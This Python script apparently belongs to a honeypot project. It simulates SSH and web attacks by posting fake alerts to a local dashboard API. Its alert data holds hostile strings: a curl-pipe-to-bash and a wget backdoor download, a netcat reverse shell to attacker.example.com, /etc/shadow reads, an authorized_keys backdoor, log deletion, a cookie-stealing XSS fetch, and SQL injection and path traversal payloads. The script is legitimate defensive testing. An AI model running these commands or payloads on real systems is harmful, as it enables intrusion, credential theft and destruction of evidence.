#!/usr/bin/env python
"""
Honeypot Attack Simulator

This script generates realistic attack simulations and sends the alerts
directly to the backend API, which will process them and display them
in the dashboard.
"""

import asyncio
import random
import time
import aiohttp
import logging
import argparse
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("attack_simulator")

# API endpoint
API_URL = "http://localhost:8001/honeypots/{honeypot_id}/alerts"

# Random source IPs to simulate different attackers
SOURCE_IPS = [
    "192.168.1.100", "10.0.0.25", "172.16.0.50", "192.168.0.10",
    "45.33.21.18", "89.105.194.89", "66.249.66.1", "77.88.55.60",
    "138.197.138.255", "104.236.213.118", "113.12.83.45",
    "23.45.67.89", "98.76.54.32", "12.34.56.78", "11.22.33.44"
]

class AttackSimulator:
    """Simulate various attacks on honeypots."""
    
    def __init__(self, api_url=API_URL):
        """Initialize the attack simulator."""
        self.api_url = api_url
        self.session = None
        self.ssh_attack_count = 0
        self.web_attack_count = 0
    
    async def setup(self):
        """Set up the simulator."""
        self.session = aiohttp.ClientSession()
    
    async def cleanup(self):
        """Clean up resources."""
        if self.session:
            await self.session.close()
    
    async def send_alert(self, honeypot_id, attack_type, attack_details, source_ip=None):
        """Send an alert to the API."""
        if not source_ip:
            source_ip = random.choice(SOURCE_IPS)
        
        alert = {
            "timestamp": datetime.now().isoformat(),
            "data": {
                "source_ip": source_ip,
                "attack_type": attack_type,
                "attack_details": attack_details
            }
        }
        
        url = self.api_url.format(honeypot_id=honeypot_id)
        logger.info(f"Sending alert for {attack_type} attack from {source_ip} to {honeypot_id}")
        
        try:
            async with self.session.post(url, json=alert) as response:
                if response.status == 200:
                    if honeypot_id.startswith("ssh"):
                        self.ssh_attack_count += 1
                    else:
                        self.web_attack_count += 1
                    logger.info(f"Alert sent successfully: {await response.text()}")
                    return True
                else:
                    logger.error(f"Failed to send alert: {response.status} - {await response.text()}")
                    return False
        except Exception as e:
            logger.error(f"Error sending alert: {str(e)}")
            return False
    
    async def simulate_ssh_brute_force(self, attempts=10):
        """Simulate SSH brute force attacks."""
        logger.info(f"Starting SSH brute force simulation ({attempts} attempts)")
        
        usernames = ["admin", "root", "administrator", "user", "ubuntu", "ec2-user", "support", "oracle", "postgres"]
        passwords = ["admin", "password", "123456", "qwerty", "letmein", "welcome", "admin123", "pass123", 
                    "password123", "admin@123", "P@ssw0rd", "Password1", "welcome1", "123qwe"]
        
        source_ip = random.choice(SOURCE_IPS)
        
        for i in range(attempts):
            username = random.choice(usernames)
            password = random.choice(passwords)
            
            attack_details = {
                "username": username,
                "password": password,
                "attempt": i+1,
                "total_attempts": attempts
            }
            
            await self.send_alert("ssh-honeypot-1", "SSH_BRUTE_FORCE", attack_details, source_ip)
            await asyncio.sleep(random.uniform(0.5, 1.5))
    
    async def simulate_ssh_command_injection(self, attempts=5):
        """Simulate SSH command injection."""
        logger.info(f"Starting SSH command injection simulation ({attempts} attempts)")
        
        commands = [
            "cat /etc/passwd",
            "cat /etc/shadow",
            "ls -la /root",
            "find / -perm -4000 -type f 2>/dev/null",
            "wget http://malicious.example.com/backdoor -O /tmp/backdoor",
            "curl -s http://malicious.example.com/script.sh | bash",
            "nc -e /bin/sh attacker.example.com 4444",
            "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys",
            "rm -rf /var/log/*",
            "cat /proc/cpuinfo | grep -c processor"
        ]
        
        source_ip = random.choice(SOURCE_IPS)
        
        for i in range(attempts):
            command = random.choice(commands)
            
            attack_details = {
                "command": command,
                "username": random.choice(["root", "admin"]),
                "session_id": f"SSH-{random.randint(1000, 9999)}",
                "attempt": i+1,
                "total_attempts": attempts
            }
            
            await self.send_alert("ssh-honeypot-1", "COMMAND_INJECTION", attack_details, source_ip)
            await asyncio.sleep(random.uniform(0.8, 2.0))
    
    async def simulate_sql_injection(self, attempts=8):
        """Simulate SQL injection attacks."""
        logger.info(f"Starting SQL injection simulation ({attempts} attempts)")
        
        payloads = [
            "' OR 1=1 --",
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "1' OR '1' = '1'",
            "' UNION SELECT username, password FROM users --",
            "admin' --",
            "' OR 1=1 LIMIT 1; --",
            "' UNION SELECT null, table_name FROM information_schema.tables --",
            "' UNION SELECT null, concat(username,':',password) FROM users --"
        ]
        
        urls = ["/login", "/search", "/products", "/users", "/admin"]
        
        source_ip = random.choice(SOURCE_IPS)
        
        for i in range(attempts):
            payload = random.choice(payloads)
            url = random.choice(urls)
            
            attack_details = {
                "url": url,
                "method": "GET" if random.random() > 0.5 else "POST",
                "payload": payload,
                "parameter": random.choice(["username", "search", "id", "query", "user_id"]),
                "attempt": i+1,
                "total_attempts": attempts
            }
            
            await self.send_alert("web-honeypot-1", "SQL_INJECTION", attack_details, source_ip)
            await asyncio.sleep(random.uniform(0.5, 1.5))
    
    async def simulate_xss_attacks(self, attempts=6):
        """Simulate XSS attacks."""
        logger.info(f"Starting XSS attack simulation ({attempts} attempts)")
        
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=\"javascript:alert('XSS')\">",
            "<body onload=alert('XSS')>",
            "<img src=\"x\" onerror=\"fetch('https://attacker.com/steal?cookie='+document.cookie)\">"
        ]
        
        urls = ["/search", "/comments", "/profile", "/feedback", "/message"]
        
        source_ip = random.choice(SOURCE_IPS)
        
        for i in range(attempts):
            payload = random.choice(payloads)
            url = random.choice(urls)
            
            attack_details = {
                "url": url,
                "method": "GET" if random.random() > 0.5 else "POST",
                "payload": payload,
                "parameter": random.choice(["q", "comment", "message", "input", "search"]),
                "attempt": i+1,
                "total_attempts": attempts
            }
            
            await self.send_alert("web-honeypot-1", "XSS", attack_details, source_ip)
            await asyncio.sleep(random.uniform(0.7, 1.8))
    
    async def simulate_path_traversal(self, attempts=5):
        """Simulate path traversal attacks."""
        logger.info(f"Starting path traversal simulation ({attempts} attempts)")
        
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\SAM",
            "../../../../etc/shadow",
            "../../../var/www/html/config.php",
            "..\\..\\..\\boot.ini",
            "../../../../proc/self/environ",
            "../../../var/log/auth.log"
        ]
        
        urls = ["/download", "/file", "/image", "/document", "/resource"]
        
        source_ip = random.choice(SOURCE_IPS)
        
        for i in range(attempts):
            payload = random.choice(payloads)
            url = random.choice(urls)
            
            attack_details = {
                "url": url,
                "method": "GET",
                "payload": payload,
                "parameter": random.choice(["file", "path", "document", "image", "resource"]),
                "attempt": i+1,
                "total_attempts": attempts
            }
            
            await self.send_alert("web-honeypot-1", "PATH_TRAVERSAL", attack_details, source_ip)
            await asyncio.sleep(random.uniform(0.6, 1.5))
    
    async def simulate_web_scanning(self, attempts=10):
        """Simulate web vulnerability scanning."""
        logger.info(f"Starting web vulnerability scanning simulation ({attempts} attempts)")
        
        targets = [
            "/.env",
            "/api/v1/admin",
            "/admin",
            "/api/v1/users",
            "/backup",
            "/admin.php",
            "/console",
            "/config",
            "/.git",
            "/wp-admin",
            "/phpinfo.php",
            "/test.php",
            "/server-status",
            "/.htaccess",
            "/web.config"
        ]
        
        source_ip = random.choice(SOURCE_IPS)
        user_agent = "Nmap Scripting Engine" if random.random() > 0.5 else "ZAP/2.11.0"
        
        for i in range(attempts):
            target = random.choice(targets)
            
            attack_details = {
                "url": target,
                "method": "GET",
                "user_agent": user_agent,
                "scanner": "Vulnerability Scanner",
                "attempt": i+1,
                "total_attempts": attempts
            }
            
            await self.send_alert("web-honeypot-1", "VULNERABILITY_SCAN", attack_details, source_ip)
            await asyncio.sleep(random.uniform(0.4, 1.0))
    
    async def run_all_simulations(self):
        """Run all attack simulations."""
        await self.setup()
        
        try:
            # Run simulations with some concurrency
            await asyncio.gather(
                self.simulate_ssh_brute_force(attempts=8),
                self.simulate_ssh_command_injection(attempts=5)
            )
            
            await asyncio.gather(
                self.simulate_sql_injection(attempts=6),
                self.simulate_xss_attacks(attempts=5),
                self.simulate_path_traversal(attempts=4)
            )
            
            await self.simulate_web_scanning(attempts=10)
            
            logger.info(f"Completed all attack simulations.")
            logger.info(f"SSH attacks: {self.ssh_attack_count}")
            logger.info(f"Web attacks: {self.web_attack_count}")
            logger.info(f"Total attacks: {self.ssh_attack_count + self.web_attack_count}")
        finally:
            await self.cleanup()

async def main():
    """Main function to run the attack simulator."""
    parser = argparse.ArgumentParser(description='Honeypot Attack Simulator')
    parser.add_argument('--api-url', type=str, default=API_URL,
                        help=f'API URL (default: {API_URL})')
    args = parser.parse_args()
    
    print("=" * 70)
    print(f"Honeypot Attack Simulator - {datetime.now()}")
    print("=" * 70)
    print(f"API URL: {args.api_url}")
    print("This tool simulates various attacks against honeypots")
    print("and sends alerts directly to the API")
    print("=" * 70)
    
    simulator = AttackSimulator(args.api_url)
    await simulator.run_all_simulations()

if __name__ == "__main__":
    asyncio.run(main())
